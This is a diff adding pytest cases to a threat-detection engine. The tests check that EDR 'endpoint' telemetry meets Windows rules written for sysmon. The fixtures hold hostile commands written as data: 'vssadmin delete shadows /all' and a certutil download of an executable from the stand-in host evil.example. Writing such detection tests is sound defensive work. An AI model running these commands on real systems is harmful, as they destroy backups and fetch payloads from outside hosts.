@@ -376,3 +376,74 @@ class TestEngineBehaviour:
         good = make_event(source="sysmon", host__name="WS01",
                           process__command_line="vssadmin.exe delete shadows /all")
         assert run(["win-shadow-copy-deletion"], [broken, good])
+
+
+class TestDataSourceGating:
+    """Which telemetry labels satisfy a rule's declared data sources.
+
+    The defect this guards was found by pushing an EDR shaped record through the
+    whole stack: the identical record produced a detection when labelled sysmon and
+    nothing at all when labelled endpoint, because fifty four Windows rules declare
+    sysmon and never mention the endpoint agent that exports the same events.
+    """
+
+    def test_a_declared_source_is_always_accepted(self):
+        from app.engine.executor import accepted_sources
+
+        assert {"sysmon", "windows_security"} <= accepted_sources(("sysmon", "windows_security"))
+
+    def test_endpoint_telemetry_satisfies_a_windows_rule(self):
+        from app.engine.executor import accepted_sources
+
+        assert "endpoint" in accepted_sources(("sysmon",))
+        assert "endpoint" in accepted_sources(("windows_security",))
+        assert "endpoint" in accepted_sources(("windows_event", "powershell"))
+
+    def test_endpoint_telemetry_does_not_satisfy_an_unrelated_rule(self):
+        from app.engine.executor import accepted_sources
+
+        assert "endpoint" not in accepted_sources(("aws_cloudtrail",))
+        assert "endpoint" not in accepted_sources(("web", "dns"))
+
+    def test_the_same_record_is_detected_under_either_label(self):
+        from app.engine.executor import DetectionEngine, HuntContext
+        from app.engine.parsers import enrich, select_parser
+        from app.engine.rules import ALL_RULES
+
+        line = (
+            '{"@timestamp":"2026-03-11T09:00:00Z","host":{"name":"WS-001"},'
+            '"process":{"name":"certutil.exe",'
+            '"command_line":"certutil.exe -urlcache -f http://evil.example/a.exe"},'
+            '"user":{"name":"jdoe"}}'
+        )
+        parser = select_parser([line], "edr-export.json")[0]
+        event = enrich(next(iter(parser.parse([line], "edr-export.json"))))
+        assert event.data_source == "endpoint", "the fixture must be EDR shaped"
+
+        as_endpoint = DetectionEngine(list(ALL_RULES)).run(HuntContext(events=[event]))
+        event.data_source = "sysmon"
+        as_sysmon = DetectionEngine(list(ALL_RULES)).run(HuntContext(events=[event]))
+        assert {finding.rule_id for finding in as_endpoint} == {
+            finding.rule_id for finding in as_sysmon
+        }
+        assert as_endpoint, "an EDR export of a lolbin download must be detected"
+
+    def test_an_endpoint_export_reaches_most_of_the_library(self):
+        from app.engine.executor import accepted_sources
+        from app.engine.rules import RULES_BY_ID
+
+        reachable = [
+            rule.id for rule in RULES_BY_ID.values()
+            if not rule.data_sources or "endpoint" in accepted_sources(rule.data_sources)
+        ]
+        assert len(reachable) >= 70, f"only {len(reachable)} rules accept endpoint telemetry"
+
+    def test_widening_changes_nothing_for_other_telemetry(self):
+        from app.engine.executor import accepted_sources
+        from app.engine.rules import RULES_BY_ID
+
+        for rule in RULES_BY_ID.values():
+            if not rule.data_sources:
+                continue
+            widened = accepted_sources(rule.data_sources)
+            assert widened - set(rule.data_sources) <= {"endpoint"}
